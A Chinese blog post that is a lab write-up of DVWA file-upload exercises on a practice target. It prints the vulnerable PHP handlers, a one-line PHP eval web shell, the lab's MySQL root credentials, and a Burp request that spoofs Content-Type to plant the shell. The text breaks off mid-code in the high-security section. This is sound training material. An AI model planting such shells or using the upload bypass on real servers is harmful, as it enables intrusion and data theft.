<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。 总实验准备： kali虚拟机、OWASPBWA靶机、win10、XShell">
<meta property="og:type" content="article">
<meta property="og:title" content="Web渗透">
<meta property="og:url" content="http://example.com/posts/54924480.html">
<meta property="og:site_name" content="v5le0n9&#39;s garden">
<meta property="og:description" content="文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。 总实验准备： kali虚拟机、OWASPBWA靶机、win10、XShell">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-04-05T01:29:27.972Z">
<meta property="article:modified_time" content="2022-11-17T06:39:34.395Z">
<meta property="article:author" content="v5le0n9">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/posts/54924480.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Web渗透 | v5le0n9's garden</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="v5le0n9's garden" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">v5le0n9's garden</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">小凉的秘密基地</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/v5le0n9" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/54924480.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="v5le0n9">
      <meta itemprop="description" content="小呀小二郎呀背着个书包上学堂">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="v5le0n9's garden">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Web渗透
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-11-17 14:39:34" itemprop="dateModified" datetime="2022-11-17T14:39:34+08:00">2022-11-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span><br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>135k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2:03</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>文章知识点建立在OWASPBWA靶机与CTFHub实验的基础上。</p>
<p>总实验准备：</p>
<p>kali虚拟机、OWASPBWA靶机、win10、XShell</p>
<span id="more"></span>
<h1 id="1-文件上传漏洞"><a href="#1-文件上传漏洞" class="headerlink" title="1. 文件上传漏洞"></a>1. 文件上传漏洞</h1><h2 id="1-1-文件上传漏洞-低"><a href="#1-1-文件上传漏洞-低" class="headerlink" title="1.1 文件上传漏洞[低]"></a>1.1 文件上传漏洞[低]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一句话木马，中国菜刀</span><br></pre></td></tr></table></figure>
<p>靶机一定要用NAT连接，桥接方式不安全。因为用靶机复制不了不方便做笔记，所以我用XShell将靶机终端连接在物理机上。查看靶机的IP地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@owaspbwa:~# dhclient eth0</span><br><span class="line">There is already a pid file /var/run/dhclient.pid with pid 2890</span><br><span class="line">killed old client process, removed PID file</span><br><span class="line">Internet Systems Consortium DHCP Client V3.1.3</span><br><span class="line">Copyright 2004-2009 Internet Systems Consortium.</span><br><span class="line">All rights reserved.</span><br><span class="line">For info, please visit https://www.isc.org/software/dhcp/</span><br><span class="line"></span><br><span class="line">Listening on LPF/eth0/00:0c:29:40:b1:22</span><br><span class="line">Sending on   LPF/eth0/00:0c:29:40:b1:22</span><br><span class="line">Sending on   Socket/fallback</span><br><span class="line">DHCPREQUEST of 192.168.137.146 on eth0 to 255.255.255.255 port 67</span><br><span class="line">DHCPACK of 192.168.137.146 from 192.168.137.254</span><br><span class="line">bound to 192.168.137.146 -- renewal in 685 seconds.</span><br></pre></td></tr></table></figure>
<p>在物理机输入靶机的IP地址<strong>192.168.137.146</strong>，在选项中找到Damn Vulnerable Web Application进入，用户名和密码均为admin。在左侧找到upload，可以试着选择文件上传，但文件大小不能过大，否则上传失败。在右下角处查看后端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码告诉我们上传的文件没有限制是图片，并且它保存的路径在当前目录的/hackable/uploads上。我们将一句话木马shell1.php文件上传到系统中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;caidao&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开中国菜刀，右键添加地址：<a target="_blank" rel="noopener" href="http://192.167.137.146/dvwa/hackable/uploads/shell1.php，后面小框填$_POST[]中的内容，即caidao。选中地址右键就可以开始搞事情了。">http://192.167.137.146/dvwa/hackable/uploads/shell1.php，后面小框填$_POST[]中的内容，即caidao。选中地址右键就可以开始搞事情了。</a></p>
<p>在菜刀中添加地址的下面有个配置框，如果知道系统的数据库密码，还可以查看系统的数据库。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>loaclhost<span class="tag">&lt;/<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>owaspbwa<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="1-2-文件上传漏洞-中"><a href="#1-2-文件上传漏洞-中" class="headerlink" title="1.2 文件上传漏洞[中]"></a>1.2 文件上传漏洞[中]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BurpSuite，一句话木马，中国菜刀</span><br></pre></td></tr></table></figure>
<p>在左侧DVWA Security可以选择安全性，这次选中级。</p>
<p>查看一下后端源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们发现多添加了一个条件判断，上传mime类型是image/jpeg，即只能上传后缀为.jpg和.jpeg的文件，并且文件大小要小于100000b。直接上传一句话木马shell1.php肯定是不行的。</p>
<p>先将之前放进uploads的所有文件删除：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@owaspbwa:~# cd /var/www/dvwa</span><br><span class="line">root@owaspbwa:/var/www/dvwa# ls</span><br><span class="line">about.php     docs         hackable          login.php    README.md     vulnerabilities</span><br><span class="line">CHANGELOG.md  dvwa         ids_log.php       logout.php   robots.txt</span><br><span class="line">config        external     index.php         phpinfo.php  security.php</span><br><span class="line">COPYING.txt   favicon.ico  instructions.php  php.ini      setup.php</span><br><span class="line">root@owaspbwa:/var/www/dvwa# cd hackable/uploads</span><br><span class="line">root@owaspbwa:/var/www/dvwa/hackable/uploads# ls</span><br><span class="line">dvwa_email.png	shell1.php</span><br><span class="line">root@owaspbwa:/var/www/dvwa/hackable/uploads# rm -rf *</span><br></pre></td></tr></table></figure>
<p>记住记住！！删除当前目录下所有文件的命令是<strong>rm -rf *</strong>，不是<strong>rm -rf /*</strong>，这是删库跑路！！血的教训…</p>
<p>所以我们要用到burpsuite，在火狐浏览器中设置为本地代理后，将发送一句话木马shell1.php的包进行拦截，将包中的Content-Type改为image/jpeg伪造成图片类型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/upload/ HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.137.146</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Length: 509</span><br><span class="line"></span><br><span class="line">Origin: http://192.168.137.146</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.137.146/dvwa/vulnerabilities/upload/</span><br><span class="line"></span><br><span class="line">Cookie: security=medium; PHPSESSID=rdm26d89oh6rmfrfi1khqpkul7; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">100000</span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell1.php&quot;</span><br><span class="line"></span><br><span class="line">Content-Type: application/x-php		//改为image/jpeg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;Upload&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Upload</span><br><span class="line"></span><br><span class="line">-----------------------------115689382727075237242790069120--</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再发送出去，系统以为我们发送的是图片类型，但实际我们发送的是一句话木马，再用中国菜刀就可以了。</p>
<p>本来想用kali直接渗透，因为Kali本机就装有burp suite，所以很方便，但不会用kali的weevely——类似于中国菜刀的程序，故放弃。</p>
<p>在物理机装好burpsuite，弄好代理，就跟上述操作一样。</p>
<h2 id="1-3-文件上传漏洞-高"><a href="#1-3-文件上传漏洞-高" class="headerlink" title="1.3 文件上传漏洞[高]"></a>1.3 文件上传漏洞[高]</h2><p>查看后端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Upload&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$target_path</span> = DVWA_WEB_PAGE_TO_ROOT.<span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">            <span class="variable">$target_path</span> = <span class="variable">$target_path</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$uploaded_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPG&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;jpeg&quot;</span> || <span class="variable">$uploaded_ext</span> == <span class="string">&quot;JPEG&quot;</span>) &amp;&amp; (<span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span>))&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;Your image was not uploaded.&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                </span><br><span class="line">                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$target_path</span> . <span class="string">&#x27; succesfully uploaded!&#x27;</span>;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">                    </span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your image was not 